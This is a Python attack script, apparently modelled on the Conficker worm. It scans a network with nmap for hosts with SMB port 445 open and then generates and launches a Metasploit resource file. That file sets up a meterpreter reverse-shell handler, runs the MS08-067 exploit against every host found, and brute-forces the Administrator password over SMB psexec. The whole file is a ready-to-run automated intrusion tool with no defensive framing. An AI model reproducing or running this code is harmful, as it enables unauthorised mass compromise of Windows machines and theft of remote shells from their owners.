#!/usr/bin/env python
import os
import argparse
import sys
import nmap


class colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"


banner = r"""{}{}
  ___  __   __ _  ____  __  ___  __ _  ____  ____ 
 / __)/  \ (  ( \(  __)(  )/ __)(  / )(  __)(  _ \
( (__(  O )/    / ) _)  )(( (__  )  (  ) _)  )   /
 \___)\__/ \_)__)(__)  (__)\___)(__\_)(____)(__\_)
============================Written by t@kuz00E898======{}
""".format(colors.OKGREEN, colors.BOLD, colors.END)


def find_hosts(host, port="445"):
    scanner = nmap.PortScanner()
    scanner.scan(host, port)
    hosts = []
    for host in scanner.all_hosts():
        if scanner[host].has_tcp(int(port)):
            if scanner[host]["tcp"][int(port)]["state"] == "open":
                print("[+] Found Target Host: {}".format(host))
                hosts.append(host)
    return hosts


def setup_handler(config, local_host, local_port):
    config.write("use exploit/multi/handler\n")
    config.write("set payload windows/meterpreter/reverse_tcp\n")
    config.write("set LPORT {}\n".format(str(local_port)))
    config.write("set LHOST {}\n".format(local_host))
    config.write("exploit -j -z\n")
    config.write("setg DisablePayloadHandler 1\n")


def conficker_exploit(config, target_host, local_host, local_port):
    config.write("use exploit/windows/smb/ms08_067_netapi\n")
    config.write("set RHOST {}\n".format(target_host))
    config.write("set payload windows/meterpreter/reverse_tcp\n")
    config.write("set LPORT {}\n".format(str(local_port)))
    config.write("set LHOST {}\n".format(local_host))
    config.write("exploit -j -z\n")


def smb_brute_force(config, target_host, local_host, local_port, username="Administrator", passwords=[]):
    for password in passwords:
        config.write("use exploit/windows/smb/psexec\n")
        config.write("set SMBUser {}\n".format(username))
        config.write("set SMBPass {}\n".format(password))
        config.write("set RHOST {}\n".format(target_host))
        config.write("set payload windows/meterpreter/reverse_tcp\n")
        config.write("set LPORT {}\n".format(str(local_port)))
        config.write("set LHOST {}\n".format(local_host))
        config.write("exploit -j -z\n")


def main():
    print(banner)
    parser = argparse.ArgumentParser(
        usage="%(prog)s -H <target host[s]> -l <local port> [-p <local host> -F <password file>]")
    parser.add_argument("-H", dest="target_host", type=str, required=True, help="specify the target address[es]")
    parser.add_argument("-p", dest="local_port", type=str, help="specify the listen port")
    parser.add_argument("-l", dest="local_host", type=str, required=True, help="specify the listen address")
    parser.add_argument("-F", dest="password_file", type=str, help="password file for SMB brute force attempt")
    options = parser.parse_args()

    local_host = options.local_host
    local_port = options.local_port
    if not local_port:
        local_port = "1337"

    with open("meta.rc", "w") as configFile:
        setup_handler(configFile, local_host, local_port)

        password_file = options.password_file
        passwords = open(password_file, "r").readlines()
        passwords = list(map(lambda l: l.strip(), passwords))

        target_hosts = find_hosts(options.target_host)
        print("[*] Found {} hosts from given {}".format(len(target_hosts), options.target_host))
        if not len(target_hosts):
            exit(0)

        for host in target_hosts:
            print("[*] Testing host {}...".format(host))
            conficker_exploit(configFile, host, local_host, local_port)
            smb_brute_force(configFile, host, local_host, local_port, passwords=passwords)

        os.system("msfconsole -r meta.rc")


if __name__ == "__main__":
    main()
